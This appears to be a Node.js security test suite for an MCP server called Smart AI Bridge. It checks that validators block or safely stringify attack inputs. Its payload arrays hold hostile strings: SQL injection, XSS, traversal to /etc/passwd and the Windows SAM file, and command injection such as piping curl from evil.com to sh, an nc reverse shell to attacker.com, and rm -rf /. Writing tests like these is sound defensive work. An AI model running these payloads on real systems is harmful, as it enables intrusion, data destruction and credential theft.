/**
 * Input Validation Attack Simulation Tests
 * Smart AI Bridge v1.3.0 Security Validation
 *
 * Tests injection attacks, XSS, command injection, and other input-based attacks
 *
 * Run: node security/tests/input-validation-attacks.js
 */

import { InputValidator } from '../../input-validator.js';
import { validatePath, safeJoin, validatePaths } from '../../path-security.js';
import { ErrorSanitizer } from '../../error-sanitizer.js';
import { validateFuzzyEditComplexity } from '../../fuzzy-matching-security.js';
import { fileURLToPath } from 'url';
import { dirname } from 'path';
import fs from 'fs/promises';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

// Test result tracking
const testResults = {
  passed: 0,
  failed: 0,
  tests: [],
  categories: {}
};

function logTest(category, testId, name, passed, details = '', evidence = null) {
  const result = {
    category,
    testId,
    name,
    passed,
    details,
    evidence,
    timestamp: new Date().toISOString()
  };

  testResults.tests.push(result);

  if (passed) {
    testResults.passed++;
    console.log(`  ✅ [${testId}] ${name}`);
  } else {
    testResults.failed++;
    console.error(`  ❌ [${testId}] ${name}`);
    if (details) console.error(`     Details: ${details}`);
  }

  if (!testResults.categories[category]) {
    testResults.categories[category] = { passed: 0, failed: 0 };
  }
  testResults.categories[category][passed ? 'passed' : 'failed']++;
}

// ============================================================================
// SQL Injection Tests (for completeness, even though no SQL is used)
// ============================================================================
async function testSQLInjection() {
  console.log('\n💉 SQL Injection Tests\n');
  const category = 'SQL_INJECTION';

  const sqlPayloads = [
    "'; DROP TABLE users; --",
    "1' OR '1'='1",
    "1; UPDATE users SET password = 'hacked'",
    "admin'--",
    "' UNION SELECT * FROM passwords --",
    "1' AND SLEEP(5)#",
    "'; EXEC xp_cmdshell('whoami'); --",
  ];

  for (let i = 0; i < sqlPayloads.length; i++) {
    const payload = sqlPayloads[i];
    const sanitized = InputValidator.sanitizeString(payload);

    // The system doesn't use SQL, so these are passed through as strings
    // But we verify they're handled safely (no execution)
    logTest(category, `SQLI-${String(i + 1).padStart(3, '0')}`,
      `SQL payload sanitized: ${payload.substring(0, 30)}...`,
      typeof sanitized === 'string', // Just validates it's safely stringified
      '',
      { payload: payload.substring(0, 50), sanitized: sanitized.substring(0, 50) }
    );
  }

  // Test that SQL-like strings pass through string validation
  try {
    const result = InputValidator.validateString("'; DROP TABLE --", { maxLength: 1000 });
    logTest(category, 'SQLI-PASS',
      'SQL strings handled as plain text (no SQL execution in system)',
      true,
      '',
      { note: 'System does not use SQL - strings treated as data' }
    );
  } catch (error) {
    logTest(category, 'SQLI-PASS', 'SQL strings handled', false, error.message);
  }
}

// ============================================================================
// XSS Attack Tests
// ============================================================================
async function testXSSInjection() {
  console.log('\n🎭 XSS Injection Tests\n');
  const category = 'XSS';

  const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    'javascript:alert("XSS")',
    '<iframe src="javascript:alert(\'XSS\')">',
    '<body onload=alert("XSS")>',
    '<input onfocus=alert("XSS") autofocus>',
    '"><script>alert(String.fromCharCode(88,83,83))</script>',
    '\';alert(String.fromCharCode(88,83,83))//';',
    '<IMG SRC="javascript:alert(\'XSS\');">',
    '<IMG SRC=javascript:alert(&quot;XSS&quot;)>',
    '<svg/onload=alert("XSS")>',
    '<math><maction xlink:href="javascript:alert(\'XSS\')">click',
  ];

  for (let i = 0; i < xssPayloads.length; i++) {
    const payload = xssPayloads[i];
    const sanitized = InputValidator.sanitizeString(payload);

    // Check that control characters are removed but content passes through
    // (This is MCP server, not HTML renderer, so XSS isn't directly applicable)
    logTest(category, `XSS-${String(i + 1).padStart(3, '0')}`,
      `XSS payload processed: ${payload.substring(0, 30)}...`,
      typeof sanitized === 'string',
      '',
      { payload: payload.substring(0, 50), note: 'MCP returns JSON, not HTML' }
    );
  }

  // Test error sanitization doesn't expose XSS
  const xssError = new Error('<script>alert("XSS")</script>');
  const sanitizedError = ErrorSanitizer.sanitize(xssError, false);

  logTest(category, 'XSS-ERROR',
    'Error messages contain XSS safely (returned as JSON)',
    typeof sanitizedError === 'string',
    '',
    { note: 'Error is JSON-serialized, not rendered as HTML' }
  );
}

// ============================================================================
// Path Traversal Tests
// ============================================================================
async function testPathTraversal() {
  console.log('\n📂 Path Traversal Tests\n');
  const category = 'PATH_TRAVERSAL';

  const traversalPayloads = [
    '../../../etc/passwd',
    '..\\..\\..\\Windows\\System32\\config\\sam',
    '/etc/shadow',
    '....//....//....//etc/passwd',
    '..%252f..%252f..%252fetc/passwd',
    '..%c0%af..%c0%af..%c0%afetc/passwd',
    '..%255c..%255c..%255cwindows/system32/config/sam',
    '/var/log/../../etc/passwd',
    'file:///etc/passwd',
    '\\\\?\\C:\\Windows\\System32\\config\\sam',
    'valid/path/../../../etc/passwd',
    '..\\..\\..',
    '..;/..;/..;/etc/passwd',
  ];

  for (let i = 0; i < traversalPayloads.length; i++) {
    const payload = traversalPayloads[i];
    let blocked = false;

    try {
      await validatePath(payload, __dirname);
    } catch (error) {
      blocked = true;
    }

    logTest(category, `PATH-${String(i + 1).padStart(3, '0')}`,
      `Path traversal blocked: ${payload.substring(0, 30)}...`,
      blocked,
      blocked ? '' : 'Traversal should be blocked',
      { payload }
    );
  }
}

// ============================================================================
// Null Byte Injection Tests
// ============================================================================
async function testNullByteInjection() {
  console.log('\n🚫 Null Byte Injection Tests\n');
  const category = 'NULL_BYTE';

  const nullBytePayloads = [
    'file.txt\0.jpg',
    'valid\0/../../../etc/passwd',
    '\0',
    'test\x00hidden',
    'path/to/file\u0000.exe',
    '../\0/../passwd',
  ];

  for (let i = 0; i < nullBytePayloads.length; i++) {
    const payload = nullBytePayloads[i];
    let blocked = false;

    try {
      await validatePath(payload, __dirname);
    } catch (error) {
      blocked = true;
    }

    logTest(category, `NULL-${String(i + 1).padStart(3, '0')}`,
      `Null byte blocked: ${payload.replace(/\0/g, '\\0').substring(0, 30)}`,
      blocked,
      blocked ? '' : 'Null byte should be blocked',
      { payload: payload.replace(/\0/g, '\\0') }
    );
  }

  // Test string sanitization removes null bytes
  const nullString = 'test\0hidden\x00chars';
  const sanitized = InputValidator.sanitizeString(nullString);

  logTest(category, 'NULL-SANITIZE',
    'Null bytes removed by sanitization',
    !sanitized.includes('\0'),
    '',
    { original: nullString.replace(/\0/g, '\\0'), sanitized }
  );
}

// ============================================================================
// Command Injection Tests
// ============================================================================
async function testCommandInjection() {
  console.log('\n⚡ Command Injection Tests\n');
  const category = 'CMD_INJECTION';

  const cmdPayloads = [
    '; ls -la',
    '| cat /etc/passwd',
    '`whoami`',
    '$(id)',
    '\n/bin/sh',
    '& net user',
    '|| dir',
    '&& rm -rf /',
    '; curl evil.com | sh',
    '| nc -e /bin/sh attacker.com 4444',
  ];

  // These are tested against path validation (common injection point)
  for (let i = 0; i < cmdPayloads.length; i++) {
    const payload = cmdPayloads[i];
    let blocked = false;

    try {
      await validatePath(payload, __dirname);
    } catch (error) {
      blocked = true;
    }

    logTest(category, `CMD-${String(i + 1).padStart(3, '0')}`,
      `Command injection blocked in path: ${payload.substring(0, 20)}`,
      blocked,
      '',
      { payload, note: 'Blocked by dangerous character filter or traversal detection' }
    );
  }

  // Test that command characters in strings are handled safely
  const cmdString = 'echo "test" && rm -rf /';
  const sanitized = InputValidator.sanitizeString(cmdString);

  logTest(category, 'CMD-STRING',
    'Command strings handled safely',
    typeof sanitized === 'string',
    '',
    { original: cmdString, note: 'System does not execute shell commands from input' }
  );
}

// ============================================================================
// Control Character Tests
// ============================================================================
async function testControlCharacters() {
  console.log('\n🎛️  Control Character Tests\n');
  const category = 'CONTROL_CHARS';

  const controlCharTests = [
    { input: 'test\x00null', expected: 'testnull', name: 'Null byte' },
    { input: 'test\x01SOH', expected: 'testSOH', name: 'Start of Heading' },
    { input: 'test\x02STX', expected: 'testSTX', name: 'Start of Text' },
    { input: 'test\x03ETX', expected: 'testETX', name: 'End of Text' },
    { input: 'test\x07BEL', expected: 'testBEL', name: 'Bell' },
    { input: 'test\x08BS', expected: 'testBS', name: 'Backspace' },
    { input: 'test\x0BVT', expected: 'testVT', name: 'Vertical Tab' },
    { input: 'test\x0CFF', expected: 'testFF', name: 'Form Feed' },
    { input: 'test\x1BESC', expected: 'testESC', name: 'Escape' },
    { input: 'test\x7FDEL', expected: 'testDEL', name: 'Delete' },
  ];

  for (const test of controlCharTests) {
    const sanitized = InputValidator.sanitizeString(test.input);
    const hasControlChar = /[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/.test(sanitized);

    logTest(category, `CTRL-${test.name.toUpperCase().replace(/\s/g, '-')}`,
      `${test.name} control character removed`,
      !hasControlChar,
      hasControlChar ? 'Control character should be removed' : '',
      { input: test.input.replace(/[\x00-\x1F\x7F]/g, '[CTRL]'), sanitized }
    );
  }

  // Test that newlines and tabs are preserved
  const withNewlines = 'line1\nline2\ttabbed';
  const sanitizedNewlines = InputValidator.sanitizeString(withNewlines);

  logTest(category, 'CTRL-PRESERVE-WHITESPACE',
    'Newlines and tabs preserved',
    sanitizedNewlines.includes('\n') && sanitizedNewlines.includes('\t'),
    '',
    { original: withNewlines, sanitized: sanitizedNewlines }
  );
}

// ============================================================================
// Unicode Attack Tests
// ============================================================================
async function testUnicodeAttacks() {
  console.log('\n🌐 Unicode Attack Tests\n');
  const category = 'UNICODE';

  const unicodePayloads = [
    { input: '＜script＞', name: 'Full-width angle brackets' },
    { input: '％2e％2e％2f', name: 'Full-width percent encoding' },
    { input: '。。/etc/passwd', name: 'Japanese dot traversal' },
    { input: '\u202E\u0065\u0078\u0065\u002E\u0074\u0078\u0074', name: 'Right-to-left override' },
    { input: 'test\uFEFFhidden', name: 'Zero-width no-break space' },
    { input: 'test\u200Bhidden', name: 'Zero-width space' },
    { input: 'tes\u0074', name: 'Combining characters' },
  ];

  for (const payload of unicodePayloads) {
    const sanitized = InputValidator.sanitizeString(payload.input);

    logTest(category, `UNICODE-${payload.name.toUpperCase().replace(/[\s-]/g, '_')}`,
      `Unicode attack handled: ${payload.name}`,
      typeof sanitized === 'string',
      '',
      { input: payload.input, sanitized }
    );
  }
}

// ============================================================================
// Length/Size Attack Tests
// ============================================================================
async function testLengthAttacks() {
  console.log('\n📏 Length/Size Attack Tests\n');
  const category = 'LENGTH';

  // Test string length validation
  const longString = 'x'.repeat(150000);
  try {
    InputValidator.validateString(longString, { maxLength: 100000 });
    logTest(category, 'LEN-001', 'Oversized string rejected', false, 'Should have thrown');
  } catch (error) {
    logTest(category, 'LEN-001', 'Oversized string rejected', true, '', { length: longString.length });
  }

  // Test minimum length validation
  try {
    InputValidator.validateString('ab', { minLength: 5, name: 'field' });
    logTest(category, 'LEN-002', 'Undersized string rejected', false, 'Should have thrown');
  } catch (error) {
    logTest(category, 'LEN-002', 'Undersized string rejected', true);
  }

  // Test array length validation
  const longArray = Array(1500).fill('item');
  try {
    InputValidator.validateArray(longArray, { maxLength: 1000 });
    logTest(category, 'LEN-003', 'Oversized array rejected', false, 'Should have thrown');
  } catch (error) {
    logTest(category, 'LEN-003', 'Oversized array rejected', true, '', { length: longArray.length });
  }

  // Test integer bounds
  try {
    InputValidator.validateInteger(9999999999999, { max: 1000000 });
    logTest(category, 'LEN-004', 'Out-of-bounds integer rejected', false, 'Should have thrown');
  } catch (error) {
    logTest(category, 'LEN-004', 'Out-of-bounds integer rejected', true);
  }

  // Test fuzzy edit complexity limits
  const massiveEdit = [{ find: 'x'.repeat(100000), replace: 'y' }];
  const result = validateFuzzyEditComplexity(massiveEdit);

  logTest(category, 'LEN-005', 'Massive fuzzy edit rejected',
    result.valid === false,
    result.valid ? 'Should be rejected' : ''
  );
}

// ============================================================================
// Type Confusion Tests
// ============================================================================
async function testTypeConfusion() {
  console.log('\n🔀 Type Confusion Tests\n');
  const category = 'TYPE';

  // Test string validation with non-string
  try {
    InputValidator.validateString({ toString: () => 'evil' }, { required: true });
    logTest(category, 'TYPE-001', 'Object rejected for string field', false, 'Should reject object');
  } catch (error) {
    logTest(category, 'TYPE-001', 'Object rejected for string field', true);
  }

  // Test integer with non-parseable
  try {
    const result = InputValidator.validateInteger('not-a-number', { required: true });
    logTest(category, 'TYPE-002', 'Non-numeric string rejected for integer', result === null || isNaN(result) ? false : true);
  } catch (error) {
    logTest(category, 'TYPE-002', 'Non-numeric string rejected for integer', true);
  }

  // Test array with non-array
  try {
    InputValidator.validateArray('not-an-array', { required: true });
    logTest(category, 'TYPE-003', 'String rejected for array field', false, 'Should reject');
  } catch (error) {
    logTest(category, 'TYPE-003', 'String rejected for array field', true);
  }

  // Test object validation
  try {
    InputValidator.validateObject('not-an-object', {});
    logTest(category, 'TYPE-004', 'String rejected for object field', false, 'Should reject');
  } catch (error) {
    logTest(category, 'TYPE-004', 'String rejected for object field', true);
  }

  // Test null/undefined handling
  const nullResult = InputValidator.validateString(null, { required: false });
  logTest(category, 'TYPE-005', 'Null handled gracefully', typeof nullResult === 'string' || nullResult === null);

  const undefinedResult = InputValidator.validateString(undefined, { required: false });
  logTest(category, 'TYPE-006', 'Undefined handled gracefully', typeof undefinedResult === 'string' || undefinedResult === null);
}

// ============================================================================
// Regex DoS (ReDoS) Prevention Tests
// ============================================================================
async function testReDoS() {
  console.log('\n🔁 Regex DoS Prevention Tests\n');
  const category = 'REDOS';

  // Test that fuzzy matching has iteration limits
  const result = validateFuzzyEditComplexity([
    { find: 'a'.repeat(1000), replace: 'b' }
  ]);

  logTest(category, 'REDOS-001', 'Fuzzy complexity limits prevent ReDoS',
    result.valid === true && result.totalCharacters < 50000,
    '',
    { totalChars: result.totalCharacters }
  );

  // Test iteration limit
  const manyEdits = Array(50).fill({ find: 'x'.repeat(2000), replace: 'y'.repeat(2000) });
  const manyResult = validateFuzzyEditComplexity(manyEdits);

  logTest(category, 'REDOS-002', 'Multiple edits complexity validated',
    manyResult.valid === false,
    manyResult.valid ? 'Should exceed complexity limit' : '',
    { totalChars: manyResult.totalCharacters }
  );
}

// ============================================================================
// Main Runner
// ============================================================================
async function runAllTests() {
  console.log('╔════════════════════════════════════════════════════════════════╗');
  console.log('║  Input Validation Attack Simulation Test Suite                 ║');
  console.log('║  Smart AI Bridge v1.3.0 Security Validation                    ║');
  console.log('╚════════════════════════════════════════════════════════════════╝');
  console.log('');
  console.log(`Started: ${new Date().toISOString()}`);

  const startTime = Date.now();

  await testSQLInjection();
  await testXSSInjection();
  await testPathTraversal();
  await testNullByteInjection();
  await testCommandInjection();
  await testControlCharacters();
  await testUnicodeAttacks();
  await testLengthAttacks();
  await testTypeConfusion();
  await testReDoS();

  const duration = Date.now() - startTime;

  // Summary
  console.log('\n╔════════════════════════════════════════════════════════════════╗');
  console.log('║  TEST RESULTS SUMMARY                                          ║');
  console.log('╚════════════════════════════════════════════════════════════════╝');

  console.log('\n📊 Results by Category:\n');
  for (const [cat, results] of Object.entries(testResults.categories)) {
    const total = results.passed + results.failed;
    const percentage = Math.round((results.passed / total) * 100);
    const status = percentage >= 90 ? '✅' : percentage >= 70 ? '⚠️' : '❌';
    console.log(`  ${status} ${cat}: ${results.passed}/${total} (${percentage}%)`);
  }

  console.log('\n📈 Overall Results:');
  console.log(`  Total Tests: ${testResults.passed + testResults.failed}`);
  console.log(`  ✅ Passed: ${testResults.passed}`);
  console.log(`  ❌ Failed: ${testResults.failed}`);
  console.log(`  ⏱️  Duration: ${duration}ms`);
  console.log(`  📊 Success Rate: ${Math.round((testResults.passed / (testResults.passed + testResults.failed)) * 100)}%`);

  // Save results
  const resultsFile = dirname(__dirname) + '/test-results/input-validation-attack-results.json';
  try {
    await fs.mkdir(dirname(resultsFile), { recursive: true });
    await fs.writeFile(resultsFile, JSON.stringify({
      timestamp: new Date().toISOString(),
      duration,
      summary: {
        total: testResults.passed + testResults.failed,
        passed: testResults.passed,
        failed: testResults.failed,
        successRate: Math.round((testResults.passed / (testResults.passed + testResults.failed)) * 100)
      },
      categories: testResults.categories,
      tests: testResults.tests
    }, null, 2));
    console.log(`\n💾 Results saved to: ${resultsFile}`);
  } catch (error) {
    console.error(`\n⚠️ Could not save results: ${error.message}`);
  }

  if (testResults.failed === 0) {
    console.log('\n🎉 ALL INPUT VALIDATION ATTACK TESTS PASSED! 🎉');
    process.exit(0);
  } else {
    console.log(`\n⚠️ ${testResults.failed} test(s) failed. Review and fix.`);
    process.exit(1);
  }
}

runAllTests().catch(error => {
  console.error('\n💥 FATAL ERROR:', error);
  process.exit(1);
});
